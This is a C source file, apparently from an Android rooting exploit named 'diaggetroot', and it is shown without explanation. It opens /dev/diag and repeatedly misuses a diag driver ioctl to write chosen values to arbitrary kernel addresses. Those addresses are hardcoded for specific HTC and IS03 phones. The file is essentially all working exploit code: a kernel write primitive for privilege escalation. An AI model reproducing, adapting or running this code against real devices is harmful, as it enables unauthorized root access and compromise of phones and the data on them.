#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <elf.h>
#include <sys/system_properties.h>
#include <fcntl.h>
#include <stdarg.h>

#define  LOG_TAG    "diaggetroot"
#define  LOGI(...)  __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)
#define  LOGD(...)  __android_log_print(ANDROID_LOG_DEBUG,LOG_TAG,__VA_ARGS__)
#define  LOGE(...)  __android_log_print(ANDROID_LOG_ERROR,LOG_TAG,__VA_ARGS__)

#include <android/log.h>

#define DIAG_IOCTL_GET_DELAYED_RSP_ID   8
struct diagpkt_delay_params{
    void *rsp_ptr;
    int size;
    int *num_bytes_ptr;
};

static void b2(void* adr, int value, int fd)
{
  uint16_t ptr;
  int i;
  int num;
  int ret;
  struct diagpkt_delay_params p;

  ptr = 0;
  p.rsp_ptr = &ptr;
  p.size = 2;
//  p.num_bytes_ptr = (void*)0xC06485A8; // IS03
//  p.num_bytes_ptr = (void*)0xc0ba8394; // HTC butterflyDNA
  p.num_bytes_ptr = (void*)0xc0ba8394; // HTC DNA
  ret = ioctl(fd, DIAG_IOCTL_GET_DELAYED_RSP_ID, &p);

  ptr = 0;
  p.rsp_ptr = &ptr;
  p.size = 2;
  num = 0;
  p.num_bytes_ptr = &num;

  ret = ioctl(fd, DIAG_IOCTL_GET_DELAYED_RSP_ID, &p);

  ptr = (value - ptr) & 0xffff;
  LOGD("loop = %x\n", ptr);
  printf("loop = %x\n", ptr);

  for(i=0; i< ptr; i++) {
    num = 0;
    p.rsp_ptr = adr;
    p.size = 2;
    p.num_bytes_ptr = &num;
    ret = ioctl(fd, DIAG_IOCTL_GET_DELAYED_RSP_ID, &p);
  }
}

void b(void* adr, int value, int fd)
{
  static int fd2;
  if(fd == 0){
    if(fd2 == 0){
      fd2 = open("/dev/diag", O_RDWR);
    }
    fd = fd2;
  }
  if(fd < 0) {
    LOGE("fd=%d", fd);
    return;
  }
  b2(adr, value, fd);
}

